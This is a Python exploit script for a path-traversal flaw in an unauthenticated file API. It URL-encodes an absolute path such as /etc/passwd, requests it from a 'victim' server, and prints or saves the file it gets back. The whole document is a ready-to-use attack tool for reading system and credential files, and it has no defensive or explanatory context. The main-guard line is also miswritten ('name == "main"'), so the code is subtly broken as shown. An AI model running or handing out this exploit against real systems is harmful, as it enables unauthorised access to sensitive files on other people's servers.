
import argparse
import requests

from urllib.parse import quote
def exploit(target, file_path, output=None):
    # Ensure the file path is absolute
    if not file_path.startswith('/'):
        print("[!] Warning: File path is not absolute. Prepending '/' to make it absolute.")
        file_path = '/' + file_path.lstrip('/')

    # URL-encode the file path
    encoded_path = quote(file_path, safe='')

    # Construct the target URL
    endpoint = f"/api/v1/files/{encoded_path}"
    url = target.rstrip('/') + endpoint
    print(f"[*] Attempting to retrieve: {file_path}")
    print(f"[*] Sending request to: {url}")
    try:
        response = requests.get(url, allow_redirects=False, timeout=10)

        if response.status_code == 200:
            print("[+] File retrieved successfully!")
            if output:
                with open(output, 'wb') as f:
                    f.write(response.content)
                print(f"[+] Content saved to: {output}")
            else:
                print("\nFile contents:")
                print(response.text)
        else:
            print(f"[-] Failed to retrieve file. Status code: {response.status_code}")
            print(f"[-] Response: {response.text[:200]}")  # Show first 200 chars of response
    except Exception as e:
        print(f"[-] An error occurred: {str(e)}")

if name == "main":
    parser = argparse.ArgumentParser(description="Exploit Path Traversal Vulnerability in Unauthenticated File API")
    parser.add_argument("target", help="Target base URL (e.g., http://victim:8080)")
    parser.add_argument("file_path", help="Absolute path to target file (e.g., /etc/passwd)")
    parser.add_argument("-o", "--output", help="Output file to save contents")

    args = parser.parse_args()

    exploit(args.target, args.file_path, args.output)